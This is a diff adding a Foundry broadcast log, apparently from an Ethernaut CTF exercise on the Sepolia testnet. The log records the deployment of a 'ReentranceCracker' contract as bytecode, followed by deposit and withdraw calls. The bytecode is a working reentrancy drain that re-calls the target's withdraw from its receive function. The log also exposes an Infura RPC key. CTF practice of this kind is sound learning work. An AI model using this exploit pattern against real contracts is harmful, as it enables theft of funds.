@@ -1,0 +1,80 @@
+{
+  "transactions": [
+    {
+      "hash": "0x832123d109236e1a95369b16d1f435c8084e27699a658b4f26568ec380ac9a97",
+      "transactionType": "CREATE",
+      "contractName": "ReentranceCracker",
+      "contractAddress": "0x20762A0DeDB3F340e9e3e91d97A577DE747fC922",
+      "function": null,
+      "arguments": [
+        "0x915aA65Ca9AF24dF9eCf5690aDF9D40c7107F9b2"
+      ],
+      "rpc": "https://sepolia.infura.io/v3/a6794e06aec04ae7b11bb58857dfd143",
+      "transaction": {
+        "type": "0x02",
+        "from": "0xec485e125d83c45cdcc734a7386a49ba994dfc1d",
+        "gas": "0x38d76",
+        "value": "0x0",
+        "data": "0x608060405234801561001057600080fd5b5060405161026938038061026983398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b6101d6806100936000396000f3fe60806040526004361061002d5760003560e01c80632f384523146100ba5780638d68cf59146100da57600080fd5b366100b55760005466038d7ea4c680006001600160a01b0390911631106100b357600054604051632e1a7d4d60e01b815266038d7ea4c6800060048201526001600160a01b0390911690632e1a7d4d90602401600060405180830381600087803b15801561009a57600080fd5b505af11580156100ae573d6000803e3d6000fd5b505050505b005b600080fd5b3480156100c657600080fd5b506100b36100d5366004610187565b6100e2565b6100b3610143565b600054604051632e1a7d4d60e01b8152600481018390526001600160a01b0390911690632e1a7d4d90602401600060405180830381600087803b15801561012857600080fd5b505af115801561013c573d6000803e3d6000fd5b5050505050565b60005460405162362a9560e01b81523060048201526001600160a01b039091169062362a959034906024016000604051808303818588803b15801561012857600080fd5b60006020828403121561019957600080fd5b503591905056fea2646970667358221220b59aa656e15ced80a6a667588a8de6f8558edf8fed42dad6ef11f8a0c353366964736f6c63430008110033000000000000000000000000915aa65ca9af24df9ecf5690adf9d40c7107f9b2",
+        "nonce": "0x5c",
+        "accessList": []
+      },
+      "additionalContracts": []
+    },
+    {
+      "hash": "0x1960058ccdf14faf0141aa9b4794946d9232147ebf5f328d5a116247984ed189",
+      "transactionType": "CALL",
+      "contractName": "ReentranceCracker",
+      "contractAddress": "0x20762A0DeDB3F340e9e3e91d97A577DE747fC922",
+      "function": "sendFunds()",
+      "arguments": [],
+      "rpc": "https://sepolia.infura.io/v3/a6794e06aec04ae7b11bb58857dfd143",
+      "transaction": {
+        "type": "0x02",
+        "from": "0xec485e125d83c45cdcc734a7386a49ba994dfc1d",
+        "to": "0x20762a0dedb3f340e9e3e91d97a577de747fc922",
+        "gas": "0x12adb",
+        "value": "0x2386f26fc10000",
+        "data": "0x8d68cf59",
+        "nonce": "0x5d",
+        "accessList": []
+      },
+      "additionalContracts": []
+    },
+    {
+      "hash": "0xd219482d20d5b02fd5f936c88b59e31b659bb58c187012dd6a2b952368ff39e6",
+      "transactionType": "CALL",
+      "contractName": "ReentranceCracker",
+      "contractAddress": "0x20762A0DeDB3F340e9e3e91d97A577DE747fC922",
+      "function": "removeFunds(uint256)",
+      "arguments": [
+        "10000000000000000"
+      ],
+      "rpc": "https://sepolia.infura.io/v3/a6794e06aec04ae7b11bb58857dfd143",
+      "transaction": {
+        "type": "0x02",
+        "from": "0xec485e125d83c45cdcc734a7386a49ba994dfc1d",
+        "to": "0x20762a0dedb3f340e9e3e91d97a577de747fc922",
+        "gas": "0xc414",
+        "value": "0x0",
+        "data": "0x2f384523000000000000000000000000000000000000000000000000002386f26fc10000",
+        "nonce": "0x5e",
+        "accessList": []
+      },
+      "additionalContracts": []
+    }
+  ],
+  "receipts": [],
+  "libraries": [],
+  "pending": [
+    "0x832123d109236e1a95369b16d1f435c8084e27699a658b4f26568ec380ac9a97",
+    "0x1960058ccdf14faf0141aa9b4794946d9232147ebf5f328d5a116247984ed189",
+    "0xd219482d20d5b02fd5f936c88b59e31b659bb58c187012dd6a2b952368ff39e6"
+  ],
+  "path": "/Users/metayan/Documents/Ethernauts/broadcast/InitiateReentrance.s.sol/11155111/run-latest.json",
+  "returns": {},
+  "timestamp": 1673547960,
+  "chain": 11155111,
+  "multi": false,
+  "commit": "da86b68"
+}
